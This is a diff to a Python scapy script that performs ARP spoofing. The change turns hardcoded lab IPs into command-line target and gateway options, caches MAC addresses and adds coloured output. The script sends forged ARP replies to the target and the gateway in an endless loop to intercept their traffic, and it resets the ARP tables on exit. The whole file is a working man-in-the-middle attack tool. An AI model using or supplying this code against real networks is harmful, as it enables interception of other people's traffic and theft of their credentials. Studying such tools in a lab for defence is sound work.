@@ -2,23 +2,35 @@
 
 import scapy.all as scapy
 from time import sleep
+import argparse
+from colorama import init, Fore
 
-ip_windows = "10.0.2.7"
-ip_router = "10.0.2.1"
+
+def get_arguments():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target_ip", help="IP for: 192.168.1.1")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="IP : 192.168.2.1")
+    options = parser.parse_args()
+    if not options.target_ip:
+        parser.error(Fore.RED + "[-]" + Fore.GREEN + "Please specify the target IP, use --help for more info.")
+    if not options.gateway_ip:
+        parser.error(Fore.RED + "[-]" + Fore.GREEN + "Please specify the gateway IP, use --help for more info.")
+
+    return options.target_ip, options.gateway_ip
 
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     ether_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = ether_broadcast / arp_request
+    arp_request_broadcast = ether_broadcast/arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    mac = answered_list[0][1].hwsrc
+    return mac
 
-    return answered_list[0][1].hwsrc
 
-
-def spoof(target_ip, spoof_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+def spoof(ip_target, mac_target, ip_spoof):
+    # target_mac = get_mac(ip_target)
+    packet = scapy.ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_spoof)
     scapy.send(packet, verbose=False)
 
 
@@ -30,19 +42,21 @@ def restore(dst_ip, src_ip):
 
 
 if __name__ == "__main__":
-    target_ip = "10.0.2.7"
-    gateway_ip = "10.0.2.1"
+    init(autoreset=True)
+    target_ip, gateway_ip = get_arguments()
+    target_mac = get_mac(target_ip)
+    gateway_mac = get_mac(gateway_ip)
     send_packets_count = 0
     try:
         while True:
-            spoof(target_ip, gateway_ip)
-            spoof(gateway_ip, target_ip)
+            spoof(target_ip, target_mac, gateway_ip)
+            spoof(gateway_ip, gateway_mac, target_ip)
             send_packets_count += 2
-            print(f"\r[+] Packets sent: {str(send_packets_count)}.", end='')
+            print(Fore.YELLOW + f"\r[+] Packets sent: {str(send_packets_count)}.", end='')
             sleep(2)
     except KeyboardInterrupt:
-        print("[+] Detecting CTRL+C. Quiting...")
-        print("[+] Resetting ARP tables... ")
+        print(Fore.RED + "\n[+] Detecting CTRL+C. Quiting...")
+        print(Fore.RED + "[+] Resetting ARP tables... ")
         restore(target_ip, gateway_ip)
         restore(gateway_ip, target_ip)
 
